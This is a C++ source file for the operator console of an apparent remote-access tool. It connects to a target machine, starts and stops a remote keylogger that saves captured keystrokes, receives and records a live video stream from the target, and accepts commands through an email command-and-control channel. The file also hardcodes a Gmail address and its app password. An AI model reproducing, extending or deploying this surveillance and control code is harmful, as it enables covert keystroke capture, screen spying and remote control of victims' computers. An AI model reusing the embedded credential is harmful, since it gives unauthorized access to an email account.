#define NOMINMAX
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <fstream>
#include <sstream>
#include <thread>
#include <chrono>
#include <memory>
#include <windows.h>
#include <iomanip>
#include <mutex>
#include <vector>
#include <atomic>
#include <filesystem>
#include <limits>

#include "client_control.h"
#include "menu_display.h"
#include "response_handler.h"
#include "../core/livestream.h"
#include "../core/mail_controller.h"
#include "../core/keylogger.h"
#include "../core/thread_manager.h"
#include "../core/constants.h"
#include "../common/string_utils.h"
#include "../common/logger.h"

#pragma comment(lib, "ws2_32.lib")

using namespace std;

unique_ptr<ClientController> clientController;
unique_ptr<ThreadManager> globalThreadManager;
unique_ptr<MailController> mailController;
unique_ptr<LivestreamClient> livestreamClient;
unique_ptr<KeyloggerReceiver> keyloggerClient;
unique_ptr<ResponseHandler> responseHandler;

atomic<bool> clientRunning(false);

filesystem::path currPath = filesystem::current_path();

string logFileName = (currPath / "client/client_log.txt").string();
Logger logFile(logFileName);
string serverIP;

void initializeMailController()
{
	if (mailController)
		return; // Already initialized

	logFile.log("EMAIL", "Initializing email controller");

	try
	{
		string email = "nightshade.demo@gmail.com";
		string password = "okpflvaogyvhezei";
		mailController = make_unique<MailController>(email, password, serverIP, 12345, *globalThreadManager);

		mailController->setCommandCallback([](const string &command) -> string
																			 {
			logFile.log("EMAIL", "Command received via email: " + command);

			if (clientController && clientController->isConnected())
			{
				if (responseHandler)
				{
					// Submit email command processing as a task
					globalThreadManager->submitNetworkTask([command]() {
						responseHandler->processCommand(command);
					}, TaskPriority::HIGH);
					return "Email command queued for processing";
				}
			}
			return "Email command failed - not connected to server"; });

		mailController->startBackgroundMonitoring(3);
		logFile.log("EMAIL", "Email monitoring initialized successfully");
	}
	catch (const exception &e)
	{
		logFile.log("EMAIL", "Email controller initialization error: " + string(e.what()));
	}
}

bool handleSpecialCommand(const string &command)
{
	if (command == "MAILSTATUS")
	{
		if (mailController)
		{
			string status = mailController->getStatus();
			bool cmdEnabled = mailController->isMailCommandEnabled();

			cout << "[Mail] Monitoring: " << status << endl;
			cout << "[Mail] Command Processing: " << (cmdEnabled ? "ENABLED" : "DISABLED") << endl;
			cout << "[Mail] Send email with subject: [Controller] <COMMAND>" << endl;
			cout << "[Mail] Example: [Controller] PROCESS" << endl;

			if (!cmdEnabled)
			{
				cout << "[Mail] Note: Commands will not be executed until ENABLEMAIL is used" << endl;
			}
		}
		else
		{
			cout << "[Mail] Email controller not initialized!" << endl;
		}
		return true;
	}

	if (command == "ENABLEMAIL")
	{
		if (mailController)
		{
			mailController->enableMailCommand(true);
			cout << "[Mail] Email command processing ENABLED" << endl;
			cout << "[Mail] The system will now execute commands received via email" << endl;
		}
		else
		{
			cout << "[Mail] Email controller not initialized!" << endl;
		}
		return true;
	}

	if (command == "DISABLEMAIL")
	{
		if (mailController)
		{
			mailController->disableMailCommand();
			cout << "[Mail] Email command processing DISABLED" << endl;
			cout << "[Mail] The system will monitor emails but won't execute commands" << endl;
			cout << "[Mail] Use ENABLEMAIL to re-enable command processing" << endl;
		}
		else
		{
			cout << "[Mail] Email controller not initialized!" << endl;
		}
		return true;
	}

	if (command == "KEYLOG")
	{
		if (keyloggerClient->isRunning())
		{
			cout << "[Client] Keylogger is already running" << endl;
			return true;
		}

		std::filesystem::create_directory(currPath / "client");

		if (clientController && clientController->isConnected())
		{
			clientController->sendCommand("KEYLOG");
			string response = clientController->receiveCommand();
			logFile.log("KEYLOG", "Server response: " + response);
			cout << "[Server]: " << response << endl;

			if (keyloggerClient->start(serverIP))
			{
				cout << "[Client] Keylogger started. Keys will be logged to ./client/keys.log" << endl;
				logFile.log("KEYLOG", "Client keylogger started successfully");
			}
			else
			{
				cout << "[Client] Failed to start keylogger client" << endl;
				logFile.log("KEYLOG", "Failed to start keylogger client");
			}
		}

		return true;
	}

	if (command == "STOPKEYLOG")
	{
		if (!keyloggerClient->isRunning())
		{
			cout << "[Client] Keylogger is not running" << endl;
			return true;
		}

		thread keylogStopThread([&]()
														{
			if (clientController && clientController->isConnected())
			{
				clientController->sendCommand("STOPKEYLOG");
				string response = clientController->receiveCommand();
				logFile.log("KEYLOG", "Server response: " + response);
				cout << "[Server]: " << response << endl;

				keyloggerClient->stop();
				cout << "[Client] Keylogger stopped. Check ./client/keys.log for captured keys" << endl;
				logFile.log("KEYLOG", "Client keylogger stopped");
			} });
		keylogStopThread.detach();

		return true;
	}

	if (command == "LIVESTREAM")
	{
		if (livestreamClient->isReceiving())
		{
			cout << "[Client] Livestream is already running" << endl;
			return true;
		}

		thread livestreamInitThread([&]()
																{
			if (clientController && clientController->isConnected())
			{
				clientController->sendCommand("LIVESTREAM");
				string response = clientController->receiveCommand();
				logFile.log("LIVESTREAM", "Server response: " + response);
			} });
		livestreamInitThread.detach();

		// Wait for server response and socket setup
		this_thread::sleep_for(chrono::milliseconds(CLIENT_STARTUP_DELAY_MS * 2));

		livestreamClient->enableFrameCapture(false); // Disable frame capture since real-time recording is active

		// Enable real-time recording for continuous video saving
		livestreamClient->enableRecording(true);

		livestreamClient->setCommandCallback([&](const std::string &stopCommand)
																				 {
			if (clientController && clientController->isConnected())
			{
				clientController->sendCommand(stopCommand);
				logFile.log("LIVESTREAM", "Sent " + stopCommand + " to server");
			} });

		bool success = livestreamClient->startReceiving(serverIP, LIVESTREAM_PORT);
		if (success)
		{
			cout << "[Client] Livestream receiver started. Close window or press ESC to stop." << endl;
			cout << "[Client] Frame capture enabled for client-side video conversion." << endl;

			// Handle display in main thread (non-blocking with UI responsiveness)
			cout << "[Client] Starting video display. Press ESC to stop or close window." << endl;
			livestreamClient->startDisplayInMainThread();

			// Clean up display
			livestreamClient->stopDisplayInMainThread();
			cout << "[Client] Livestream display stopped." << endl;
		}
		else
		{
			cout << "[Client] Failed to start livestream receiver." << endl;
		}
		return true;
	}

	return false;
}

int main()
{
	std::filesystem::create_directory(currPath / "client");

	logFile.log("MAIN", "=== REMOTE CONTROL CLIENT STARTED ===");
	logFile.log("MAIN", "Log file initialized: " + logFileName);

	// Initialize global thread manager
	globalThreadManager = make_unique<ThreadManager>();
	if (!globalThreadManager->initialize())
	{
		logFile.log("MAIN", "Failed to initialize thread manager");
		cout << "Failed to initialize thread manager" << endl;
		return 1;
	}

	// Initialize components with thread manager reference
	livestreamClient = make_unique<LivestreamClient>(*globalThreadManager);
	keyloggerClient = make_unique<KeyloggerReceiver>(*globalThreadManager);

	clientController = make_unique<ClientController>();

	if (!clientController->initialize())
	{
		logFile.log("MAIN", "Failed to initialize client controller");
		cout << "Failed to initialize client controller" << endl;
		return 1;
	}

	// Loop until valid IP and successful connection
	bool connected = false;
	while (!connected)
	{
		cout << "Enter server IP: ";
		getline(cin, serverIP);
		serverIP = trimString(serverIP);

		if (serverIP.empty())
		{
			cout << "IP address cannot be empty. Please try again." << endl;
			continue;
		}

		logFile.log("MAIN", "User entered server IP: " + serverIP);

		if (clientController->connectToServer(serverIP))
		{
			connected = true;
			logFile.log("MAIN", "Connected to server successfully");
		}
		else
		{
			logFile.log("MAIN", "Failed to connect to server: " + serverIP);
			cout << "Connection failed. Please check the IP address and try again." << endl;
		}
	}

	logFile.log("MAIN", "Connected to server successfully");

	// Initialize ResponseHandler with thread manager
	responseHandler = make_unique<ResponseHandler>(*globalThreadManager, logFile, *clientController, *livestreamClient, currPath / "client");

	// Initialize email controller using ThreadManager
	initializeMailController();

	clientRunning = true;
	string command = "";

	while (clientRunning.load())
	{
		displayMenu();
		command = "";
		getline(cin, command);

		cin.clear();

		command = trimString(command);
		if (command.empty())
		{
			continue;
		}
		logFile.log("MAIN", "User input: " + command);

		if (command == "EXIT")
		{
			logFile.log("MAIN", "Exit command received");
			break;
		}

		if (handleSpecialCommand(command))
		{
			cout << endl;
			continue;
		}

		// Use ResponseHandler with ThreadManager instead of creating detached threads
		if (responseHandler)
		{
			globalThreadManager->submitDataTask([command]()
																					{ responseHandler->processCommand(command); }, TaskPriority::NORMAL);
		}

		cout << endl;
		cin.get(); // Wait for user to press Enter before continuing
	}

	logFile.log("MAIN", "Client shutting down...");
	clientRunning = false;

	if (livestreamClient->isReceiving())
	{
		livestreamClient->stopReceiving();
	}

	if (keyloggerClient->isRunning())
	{
		keyloggerClient->stop();
		logFile.log("MAIN", "Keylogger stopped during cleanup");
	}

	// Shutdown thread manager
	if (globalThreadManager)
	{
		globalThreadManager->shutdown();
	}

	if (clientController)
	{
		clientController->disconnect();
	}

	if (logFile.is_open())
	{
		logFile.log("MAIN", "Client shutdown complete - Triple-thread architecture");
		logFile.close();
	}

	cout << "Client shutdown complete." << endl;
	return 0;
}